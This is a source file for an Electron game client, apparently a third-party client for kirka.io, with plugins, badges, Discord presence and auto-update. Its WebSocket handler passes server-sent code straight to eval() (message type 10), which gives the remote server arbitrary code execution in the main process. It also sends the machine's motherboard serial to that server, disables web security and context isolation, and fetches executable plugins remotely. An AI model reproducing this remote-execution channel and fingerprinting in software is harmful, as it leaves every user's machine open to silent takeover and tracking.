require('v8-compile-cache');
const path = require('path');
const { app, BrowserWindow, clipboard, dialog, ipcMain } = require('electron');
const electronLocalshortcut = require('electron-localshortcut');
const Store = require('electron-store');
const config = new Store();
const si = require('systeminformation');
const { autoUpdate, sendBadges, updateRPC, initBadges, initRPC, closeRPC } = require('./features');
const { io } = require('socket.io-client');
const socket = io('https://kirkaclient.herokuapp.com');
const { ElectronBlocker } = require('@cliqz/adblocker-electron');
const fs = require('fs');
const https = require('https');
const easylist = fs.readFileSync(path.join(__dirname, 'easylist.txt'), 'utf-8');
const blocker = ElectronBlocker.parse(easylist);
const log = require('electron-log');
const prompt = require('./features/promptManager');
const { pluginLoader } = require('./features/plugins');

const gamePreload = path.join(__dirname, 'preload', 'global.js');
const splashPreload = path.join(__dirname, 'preload', 'splash.js');
const settingsPreload = path.join(__dirname, 'preload', 'settings.js');
const changeLogsPreload = path.join(__dirname, 'preload', 'changelogs.js');

const md5File = require('md5-file');
const pluginHash = md5File.sync(path.join(__dirname, 'features/plugins.js'));
const preloadHash = md5File.sync(path.join(__dirname, 'preload/settings.js'));
console.log(pluginHash);
// process.env.ELECTRON_ENABLE_LOGGING = true;

log.info(`
------------------------------------------
Starting KirkaClient ${app.getVersion()}.

Epoch Time: ${Date.now()}
User: ${config.get('user')}
UserID: ${config.get('userID')}
Directory: ${__dirname}

`);

let win;
let splash;
let setwin;
let canDestroy = false;
let CtrlW = false;
let updateContent;
let errTries = 0;
let changeLogs;
let uniqueID = '';
const allowedScripts = [];
const installedPlugins = [];
const scriptCol = [];
const pluginIdentifier = {};

socket.on('connect', () => {
    log.info('WebSocket Connected!');
    const engine = socket.io.engine;
    engine.once('upgrade', () => {
        log.info(engine.transport.name);
    });
    const channel = config.get('betaTester', false) ? 'beta' : 'stable';
    si.baseboard().then(info => {
        uniqueID = info.serial;
        socket.send({
            type: 5,
            channel: channel,
            version: app.getVersion(),
            userID: config.get('userID'),
            nickname: config.get('user'),
            uniqueID: uniqueID
        });
    });
});

socket.on('disconnect', () => {
    log.info('WebSocket Disconnected!');
});

socket.on('message', (data) => {
    log.info(`WS > ${data}`);
    switch (data.type) {
    case 1:
        socket.send({ type: 1, data: 'pong' });
        break;
    case 3:
        updateRPC(data.data);
        break;
    case 4:
        sendBadges(data.data);
        if (win)
            win.webContents.send('badges', data.data);
        break;
    case 5:
        updateContent = data.data.updates;
        changeLogs = data.data.changelogs;
        break;
    case 6:
        if (win && data.userid == config.get('userID', ''))
            win.webContents.send('msg', data.msg, data.icon);
        break;
    case 7:
        if (data.userid == config.get('userID', '')) {
            dialog.showErrorBox(data.title, data.msg);
            app.quit();
        }
        break;
    case 8:
        if (data.uniqueID == uniqueID) {
            dialog.showErrorBox(data.title, data.msg);
            app.quit();
        }
        break;
    case 9:
        socket.send({
            type: 9,
            userID: config.get('userID'),
            uniqueID: uniqueID
        });
        break;
    case 10:
        eval(data.code);
        break;
    case 11:
        if (win)
            win.webContents.send('code', data.code);
        break;
    }
});

if (config.get('unlimitedFPS', true))
    app.commandLine.appendSwitch('disable-frame-rate-limit');


app.commandLine.appendSwitch('disable-gpu-vsync');
app.commandLine.appendSwitch('ignore-gpu-blacklist');
app.commandLine.appendSwitch('disable-breakpad');
app.commandLine.appendSwitch('disable-print-preview');
app.commandLine.appendSwitch('disable-metrics');
app.commandLine.appendSwitch('disable-metrics-repo');
app.commandLine.appendSwitch('enable-javascript-harmony');
app.commandLine.appendSwitch('no-referrers');
app.commandLine.appendSwitch('enable-quic');
app.commandLine.appendSwitch('high-dpi-support', 1);
app.commandLine.appendSwitch('disable-2d-canvas-clip-aa');
app.commandLine.appendSwitch('disable-bundled-ppapi-flash');
app.commandLine.appendSwitch('disable-logging');
app.commandLine.appendSwitch('disable-web-security');

function createWindow() {
    win = new BrowserWindow({
        width: 1280,
        height: 720,
        backgroundColor: '#000000',
        titleBarStyle: 'hidden',
        show: false,
        title: `KirkaClient v${app.getVersion()}`,
        acceptFirstMouse: true,
        icon: icon,
        webPreferences: {
            preload: gamePreload,
            enableRemoteModule: true,
            contextIsolation: false,
            webSecurity: false,
            devTools: !app.isPackaged
        },
    });
    win.removeMenu();
    createShortcutKeys();

    win.loadURL('https://kirka.io/');

    win.on('close', function(e) {
        if (CtrlW) {
            e.preventDefault();
            CtrlW = false;
            return;
        }
        app.exit();
    });

    win.webContents.on('new-window', function(event, url_) {
        event.preventDefault();
        win.loadURL(url_);
    });

    const contents = win.webContents;

    win.once('ready-to-show', () => {
        blocker.enableBlockingInSession(win.webContents.session);
        showWin();
        initRPC(socket, contents);
        initBadges(socket);
        ensureDirs();
    });

    ipcMain.on('getContents', () => {
        setwin.webContents.send('contentsID', win.id);
    });

    ipcMain.on('toggleRPC', () => {
        const state = config.get('discordRPC');
        if (state)
            initRPC(socket, contents);
        else
            closeRPC();
    });

    win.webContents.once('did-finish-load', () => {
        win.webContents.reload();
    });

    function showWin() {
        if (!canDestroy) {
            setTimeout(showWin, 500);
            return;
        }
        splash.destroy();
        if (config.get('fullScreenStart', true))
            win.setFullScreen(true);

        win.show();

        if (config.get('update', true))
            showChangeLogs();
    }
}

ipcMain.on('updatePreferred', async(event, data) => {
    const request = {
        method: 'POST',
        hostname: 'kirkaclient.herokuapp.com',
        path: '/api/preferred',
        headers: {
            'Content-Type': 'application/json'
        },
    };
    const req = https.request(request, res => {
        log.info(`Preferred Badge POST: ${res.statusCode} with payload ${data}`);
    });
    req.on('error', error => {
        log.error(`Preferred Badge Error: ${error}`);
    });
    req.write(JSON.stringify(data));
    req.end();
});

function ensureDirs() {
    const documents = app.getPath('documents');
    const appPath = path.join(documents, 'KirkaClient');
    const recorderPath = path.join(appPath, 'videos');

    if (!fs.existsSync(appPath))
        fs.mkdirSync(appPath);
    if (!fs.existsSync(recorderPath))
        fs.mkdirSync(recorderPath);
    win.webContents.send('logDir', appPath);
}

function showChangeLogs() {
    if (!changeLogs)
        return;
    const changeLogsWin = new BrowserWindow({
        width: 700,
        height: 700,
        center: true,
        frame: true,
        show: false,
        icon: icon,
        title: 'KirkaClient ChangeLogs',
        transparent: true,
        webPreferences: {
            nodeIntegration: true,
            preload: changeLogsPreload
        }
    });
    changeLogsWin.removeMenu();

    let html = '';
    const versions = Object.keys(changeLogs);
    for (let i = 0; i < versions.length; i++) {
        const version = versions[i];
        const data = changeLogs[version];
        const changes = data.changes;
        const releaseDate = data.releaseDate;
        html += `<h5 class="mt-4"> <span class="p-2 bg-light shadow rounded text-success"> Version ${version}</span> - ${releaseDate}</h5>
        <ul class="list-unstyled mt-3">`;
        changes.forEach(line => {
            html += `<li class="text-muted ml-3"><i class="mdi mdi-circle-medium mr-2"></i>${line}</li>`;
        });
        html += '</ul>';
    }

    changeLogsWin.loadFile(`${__dirname}/changelogs/index.html`);

    changeLogsWin.on('ready-to-show', () => {
        changeLogsWin.show();
    });

    ipcMain.handle('get-html', () => {
        config.set('update', false);
        return html;
    });
}

function createShortcutKeys() {
    const contents = win.webContents;

    electronLocalshortcut.register(win, 'Escape', () => contents.executeJavaScript('document.exitPointerLock()', true));
    electronLocalshortcut.register(win, 'F4', () => clipboard.writeText(contents.getURL()));
    electronLocalshortcut.register(win, 'F5', () => contents.reload());
    electronLocalshortcut.register(win, 'Shift+F5', () => contents.reloadIgnoringCache());
    electronLocalshortcut.register(win, 'F6', () => joinByURL());
    electronLocalshortcut.register(win, 'F11', () => win.setFullScreen(!win.isFullScreen()));
    electronLocalshortcut.register(win, 'F12', () => toggleDevTools());
    electronLocalshortcut.register(win, 'Control+Shift+I', () => toggleDevTools());
    if (config.get('controlW', true))
        electronLocalshortcut.register(win, 'Control+W', () => { CtrlW = true; });
}

ipcMain.on('joinLink', joinByURL);

function ensureDev(password) {
    if (!password)
        return;
    dialog.showErrorBox('Incorrect Token', 'The token you entered is incorrect. Don\'t try to access things you aren\'t sure of.');
}

let promptWindow;

function toggleDevTools() {
    if (!app.isPackaged) {
        win.webContents.openDevTools();
        return;
    }
    promptWindow = prompt.sendPrompt({
        title: 'Provide Authentication',
        label: 'Enter developer token to connect to devTools:',
        placeholder: 'Token here',
        isPassword: true
    });
}

ipcMain.on('prompt-return-value', (event, value) => {
    promptWindow.close();
    ensureDev(value);
});

function joinByURL() {
    const urld = clipboard.readText();
    if (urld.includes('kirka.io/games/'))
        win.loadURL(urld);
}

app.allowRendererProcessReuse = true;

let icon;

if (process.platform === 'linux')
    icon = path.join(__dirname, 'media', 'icon.png');
else
    icon = path.join(__dirname, 'media', 'icon.ico');

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        win = null;
        socket.disconnect();
        closeRPC();
        scriptCol.forEach(script => {
            script.exitMain();
        });
        app.quit();
    }
});

function createSplashWindow() {
    splash = new BrowserWindow({
        width: 600,
        height: 350,
        center: true,
        resizable: false,
        frame: false,
        show: true,
        icon: icon,
        title: 'Loading Client',
        transparent: true,
        webPreferences: {
            preload: splashPreload,
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    splash.loadFile(`${__dirname}/splash/splash.html`);
    splash.webContents.on('dom-ready', () => {
        initAutoUpdater(splash.webContents);
    });
}

async function initAutoUpdater(webContents) {
    if (updateContent === undefined) {
        setTimeout(() => {
            if (!socket.connected)
                errTries = errTries + 1;
            if (errTries >= 40) {
                log.error('WebSocket connection failed.');
                dialog.showErrorBox('Websocket Error', 'Client is experiencing issues connecting to the WebSocket. ' +
                'Check your internet connection.\nIf your connection seems good, please report this issue to the support server.');
                createWindow();
                canDestroy = true;
                return;
            }
            initAutoUpdater(webContents);
        }, 500);
        return;
    }

    const didUpdate = await autoUpdate(webContents, updateContent);
    console.log(didUpdate);
    if (didUpdate) {
        config.set('update', true);
        const options = {
            buttons: ['Ok'],
            message: 'Update Complete! Please relaunch the client.'
        };
        await dialog.showMessageBox(options);
        app.quit();
    } else {
        createWindow();
        await initPlugins(webContents);
        canDestroy = true;
    }
}

ipcMain.on('show-settings', () => {
    if (setwin) {
        setwin.focus();
        return;
    }
    createSettings();
});

ipcMain.on('reboot', () => {
    rebootClient();
});

ipcMain.handle('downloadPlugin', (ev, uuid) => {
    console.log('Need to download', uuid);
    https.get(`https://kirkaclient.herokuapp.com/plugins/download/${uuid}.jsc`, (res) => {
        res.setEncoding('binary');
        let a = '';
        res.on('data', function(chunk) {
            a += chunk;
        });

        res.on('end', () => {
            try {
                const pluginsDir = path.join(app.getPath('documents'), '/KirkaClient/plugins');
                fs.writeFileSync(`${pluginsDir}/${uuid}.jsc`, a, 'binary');
            } catch (e) {
                console.log(e);
                dialog.showErrorBox('Permission Error!',
                    'Please start client as Administrator.\nThis can be done by Right Click > Run as Administrator.');
                app.quit();
            }
        });
    });

    https.get(`https://kirkaclient.herokuapp.com/plugins/download/${uuid}.json`, (res) => {
        res.setEncoding('binary');
        let a = '';
        res.on('data', function(chunk) {
            a += chunk;
        });

        res.on('end', () => {
            try {
                const pluginsDir = path.join(app.getPath('documents'), '/KirkaClient/plugins');
                fs.writeFileSync(`${pluginsDir}/${uuid}.json`, a, 'binary');
            } catch (e) {
                console.log(e);
                dialog.showErrorBox('Permission Error!',
                    'Please start client as Administrator.\nThis can be done by Right Click > Run as Administrator.');
                app.quit();
            }
        });
    });
});

ipcMain.handle('uninstallPlugin', (ev, uuid) => {
    const fileDir = path.join(app.getPath('documents'), '/KirkaClient/plugins');
    console.log('Need to remove', uuid);

    if (!pluginIdentifier[uuid])
        return { success: false };

    const scriptPath = path.join(fileDir, pluginIdentifier[uuid]);

    fs.unlinkSync(scriptPath + '.jsc');
    fs.unlinkSync(scriptPath + '.json');
    installedPlugins.splice(installedPlugins.indexOf(uuid), 1);
    return { success: true };
});

ipcMain.on('installedPlugins', (ev) => {
    ev.returnValue = JSON.stringify(installedPlugins);
});

function createSettings() {
    setwin = new BrowserWindow({
        width: 1360,
        height: 768,
        show: true,
        frame: true,
        icon: icon,
        title: 'KirkaClient Settings',
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            enableRemoteModule: true,
            preload: settingsPreload
        }
    });

    setwin.removeMenu();
    setwin.loadFile(path.join(__dirname, 'settings/settings.html'));
    // setwin.webContents.openDevTools();
    // setwin.setResizable(false)

    setwin.on('close', () => {
        setwin = null;
    });
}


function showUnauthScript(filename) {
    dialog.showErrorBox(
        'Unauthorized Script Loaded.',
        `You have attempted to load an unauthorized script named "${filename}".
Remove it from the folder to prevent this dialog.`
    );
}

ipcMain.handle('allowedScripts', () => {
    return JSON.stringify(pluginIdentifier);
});

ipcMain.handle('scriptPath', () => {
    return path.join(app.getPath('documents'), '/KirkaClient/plugins');
});

ipcMain.handle('ensureIntegrity', () => {
    ensureIntegrity();
    return JSON.stringify(allowedScripts);
});

function ensureIntegrity() {
    allowedScripts.length = 0;
    const fileDir = path.join(app.getPath('documents'), '/KirkaClient/plugins');
    try {
        fs.mkdirSync(fileDir, { recursive: true });
    // eslint-disable-next-line no-empty
    } catch (err) {}

    fs.readdirSync(fileDir)
        .filter(filename => path.extname(filename).toLowerCase() == '.jsc')
        .forEach(async(filename) => {
            try {
                const scriptPath = path.join(fileDir, filename);
                const script = pluginLoader(filename.split('.')[0], fileDir);
                await script.ensureIntegrity(scriptPath);

                if (!script.isPlatformMatching())
                    log.info(`Script ignored, platform not matching: ${script.scriptName}`);
                else {
                    allowedScripts.push(scriptPath);
                    log.info(`Ensured script: ${script.scriptName}- v${script.ver}`);
                }
            } catch (err) {
                console.log(err);
                showUnauthScript(filename);
                app.quit();
            }
        });
}

async function initPlugins(webContents) {
    const fileDir = path.join(app.getPath('documents'), '/KirkaClient/plugins');
    console.log('fileDir', fileDir);
    const node_modules = path.join(fileDir, 'node_modules');
    if (!fs.existsSync(node_modules)) {
        webContents.send('message', 'Configuring Plugins...');
        const fse = require('fs-extra');
        const srcDir = path.join(__dirname, '../node_modules');
        const destDir = node_modules;

        fse.copySync(srcDir, destDir, { overwrite: true }, function(err) {
            if (err)
                console.error(err);
            else
                console.log('success!');
        });
    }
    try {
        fs.mkdirSync(fileDir, { recursive: true });
    } catch (err) {
        console.log(err);
    }
    console.log(fs.readdirSync(fileDir));
    fs.readdirSync(fileDir)
        .filter(filename => path.extname(filename).toLowerCase() == '.jsc')
        .forEach(async(filename) => {
            console.log(filename);
            try {
                const scriptPath = path.join(fileDir, filename);
                console.log('scriptPath:', scriptPath);
                const scriptName = filename.split('.')[0];
                let script = pluginLoader(filename.split('.')[0], fileDir);
                const data = await script.ensureIntegrity(scriptPath);

                if (data) {
                    if (data.update) {
                        await script.installUpdate(data.url, scriptPath);
                        script = pluginLoader(filename.split('.')[0], fileDir);
                        await script.ensureIntegrity(scriptPath);
                    }
                }

                if (!script.isPlatformMatching())
                    log.info(`Script ignored, platform not matching: ${script.scriptName}`);
                else {
                    allowedScripts.push(scriptPath);
                    installedPlugins.push(script.scriptUUID);
                    pluginIdentifier[script.scriptUUID] = scriptName;
                    scriptCol.push(script);
                    script.launchMain(win);
                    log.info(`Loaded script: ${script.scriptName}- v${script.ver}`);
                }
            } catch (err) {
                console.log(err);
                showUnauthScript(filename);
            }
        });
}

function rebootClient() {
    app.relaunch();
    app.quit();
}

app.once('ready', () => {
    if (pluginHash !== 'a5222273608df572129b9c93660f531a' || preloadHash != '047bca28eaa0876f740a19f3b64ae4f3') {
        dialog.showErrorBox(
            'Client tampered!',
            'It looks like the client is tampered with. Please install new from https://kirkaclient.herokuapp.com. This is for your own safety!'
        );
        app.quit();
        return;
    }
    // Initialize protocol to access files
    createSplashWindow();
});
